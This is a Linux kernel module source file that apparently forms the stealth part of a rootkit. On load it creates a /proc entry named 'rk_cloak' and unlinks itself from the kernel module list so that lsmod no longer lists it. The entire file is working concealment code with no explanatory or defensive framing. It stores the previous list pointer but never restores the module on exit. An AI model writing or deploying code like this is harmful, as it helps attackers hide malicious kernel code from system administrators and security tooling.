// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

static struct proc_dir_entry *proc_entry;
static struct list_head *saved_prev;

static void vanish_from_lsmod(void)
{
	saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);
	pr_info("rk: module hidden from lsmod\n");
}

static int stealth_show(struct seq_file *m, void *v)
{
	seq_puts(m, "hidden\n");
	return 0;
}

static int __init conceal_init(void)
{
	proc_entry = proc_create_single("rk_cloak", 0444, NULL, stealth_show);
	if (!proc_entry)
		return -ENOMEM;

	vanish_from_lsmod();
	return 0;
}

static void __exit conceal_exit(void)
{
	proc_remove(proc_entry);
}

module_init(conceal_init);
module_exit(conceal_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Module list concealment");
